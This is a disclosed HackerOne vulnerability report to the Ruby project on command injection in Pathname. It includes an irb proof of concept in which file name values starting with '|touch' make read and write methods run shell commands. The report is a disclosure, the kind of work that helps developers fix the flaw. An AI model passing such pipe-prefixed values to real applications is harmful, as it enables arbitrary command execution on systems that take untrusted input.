# Command injection in Pathname

## Report Details
- **Report ID**: 449482
- **URL**: https://hackerone.com/reports/449482
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-11-25T07:57:29.658Z
- **Disclosed**: 2019-04-01T11:52:19.817Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
The command may be executed when the value passed to Pathname is the first character of "|".
This is the same problem as https://bugs.ruby-lang.org/issues/14245, but here it is executed without warning.

```ruby
$ ruby -v
ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-darwin16]

$ irb
irb(main):001:0> `ls`
=> ""

irb(main):002:0> require 'pathname'
=> true
irb(main):003:0> Pathname("|touch binread").binread
=> ""
irb(main):004:0> Pathname("|touch binwrite").binwrite("")
=> 0
irb(main):005:0> Pathname("|touch each_line").each_line {|v| p v}
=> nil
irb(main):006:0> Pathname("|touch read").read
=> ""
irb(main):007:0> Pathname("|touch readlines").readlines
=> []
irb(main):008:0> Pathname("|touch write").write("")
=> 0

irb(main):009:0> `ls`
=> "binread\nbinwrite\neach_line\nread\nreadlines\nwrite\n"
```

## Impact

The command may be executed unintentionally.

However, this is the same behavior as `IO` and can be inferred from the document.
https://ruby-doc.org/stdlib-2.5.0/libdoc/pathname/rdoc/Pathname.html#class-Pathname-label-IO

## Attachments
No attachments
